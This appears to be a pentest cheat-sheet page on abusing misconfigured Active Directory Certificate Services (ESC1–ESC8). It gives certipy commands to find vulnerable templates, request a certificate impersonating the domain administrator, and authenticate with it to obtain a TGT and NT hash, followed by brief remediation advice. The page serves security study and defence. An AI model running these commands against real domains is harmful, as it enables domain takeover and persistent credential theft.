---
tags:
  - Network
  - Windows
---

# :material-certificate: AD Certificate Services (ESC)

<span class="pill pill-hard">domain takeover</span> <span class="pill pill-info">network</span>

Misconfigured Active Directory Certificate Services templates let a low-priv user enroll a certificate that authenticates as *anyone* — often the fastest path to Domain Admin.

!!! abstract "TL;DR"
    Run `certipy find` to spot vulnerable templates (ESC1–ESC8+), request a cert impersonating a DA, then authenticate with it via PKINIT.

## :material-magnify: Find weaknesses

```bash
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.5 -vulnerable -stdout
```

| ESC | Misconfig |
| --- | --- |
| ESC1 | Template allows requester-supplied SAN + client auth |
| ESC2 | "Any Purpose" EKU |
| ESC3 | Enrollment Agent template |
| ESC4 | Attacker has write over a template |
| ESC8 | HTTP enrollment → NTLM relay target |

## :material-account-arrow-up: ESC1 in practice

```bash
# Request a cert for yourself but as the DA (SAN abuse)
certipy req -u user@corp.local -p pass -ca CORP-CA \
  -template VulnTemplate -upn administrator@corp.local

# Authenticate with the cert → TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
```

!!! loot "Certs don't expire on password change"
    A stolen/forged cert keeps authenticating even after the victim resets their password — durable, quiet persistence.

## :material-shield-check: Remediation

- Remove `ENROLLEE_SUPPLIES_SUBJECT` on auth templates; require manager approval.
- Disable NTLM to AD CS web endpoints; audit template ACLs.

## :material-link-variant: Related

- ESC8 pairs with [NTLM Relay](ntlm-relay.md); output feeds [Active Directory](active-directory.md) and [Kerberos](kerberos.md).
- Reference: [SpecterOps — Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2).
